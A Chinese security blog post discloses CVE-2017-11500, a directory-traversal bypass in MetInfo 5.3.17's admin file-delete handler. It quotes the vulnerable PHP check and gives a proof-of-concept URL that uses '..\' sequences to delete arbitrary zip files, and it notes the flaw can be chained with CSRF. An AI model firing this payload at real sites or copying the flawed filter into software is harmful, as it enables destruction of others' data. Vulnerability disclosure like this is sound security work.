=== Content from blackwolfsec.cc_799d51b9_20250124_183942.html ===


[BlackWolf](/)
# BlackWolfsec

* [首页](/)
* [分类](/categories)
* [归档](/archives)
* [标签](/tags)
* [我的简历](/about)
* 搜索

## Metinfo最新版5.3.17后台目录遍历Bypass

发表于
2017-07-20

|

分类于
[代码审计](/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/)

|

## 0x00前言

[CVE-2017-11500](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-11500)这个漏洞比较鸡肋，Metinfo最新版5.3.17后台某处目录遍历Bypass，可以删除任意zip文件。

## 0x02漏洞详情

| ``` 12345678 ``` | ``` # /admin/system/database/filedown.phpif($action=='delete'){	if(substr_count(trim($filenames),'../'))die('met2');	if(fileext($filenames)=='zip'){		@unlink('../../databack/'.$fileon.'/'.$filenames);	}	metsave($rurls,'',$depth);} ``` |
| --- | --- |

检测如果$filenames包含`../`则直接退出，但是这个很容易利用`..\`即可Bypass，然后检测文件的后缀名如果是zip就直接删除文件，所以存在目录遍历删除任意的zip文件。
POC如下：

| ``` 1 ``` | ``` http://localhost/MetInfo5.3/admin/system/database/filedown.php?anyid=13&action=delete&filenames=..\..\..\..\..\..\..\..\..\..\..\..\..\..\test.zip&fileon=web&lang=cn ``` |
| --- | --- |

![目录遍历](http://blackwolfsec.cc/static/picture/metinfo-1.jpg)

## 0x02小结

`/admin/system/database/filedown.php`文件的`$filenames`参数存在目录遍历删除任意的zip文件，此处没有CSRF防护，可以结合CSRF漏洞利用。

[# PHP](/tags/PHP/)
[# 代码审计](/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/)
[# CVE](/tags/CVE/)

[Docker检测技术研究](/2017/07/11/docker-detection-technology/ "Docker检测技术研究")

[阿里先知XSS挑战赛](/2017/08/30/alixss/ "阿里先知XSS挑战赛")

* 文章目录
* 站点概览

![邮箱地址：YWRtaW5AYmxhY2t3b2xmc2VjLmNj](/static/picture/logo.jpg)
[53
日志](/archives)

[10
分类](/categories/index.html)

[51
标签](/tags/index.html)

[RSS](/atom.xml)

[安全圈](http://anquanquan.info "安全圈")

[小黑屋](http://das.scusec.org/ "小黑屋")

[ourren](http://www.ourren.com/ "ourren")

[零の杂货铺](http://phantom0301.cc/ "零の杂货铺")

1. [1. 0x00前言](#0x00前言)
2. [2. 0x02漏洞详情](#0x02漏洞详情)
3. [3. 0x02小结](#0x02小结)

© 2016 -
2020

邮箱地址：YWRtaW5AYmxhY2t3b2xmc2VjLmNj

由 [Hexo](https://hexo.io) 强力驱动

主题 -
[NexT.Mist](http://blackwolfsec.cc/)


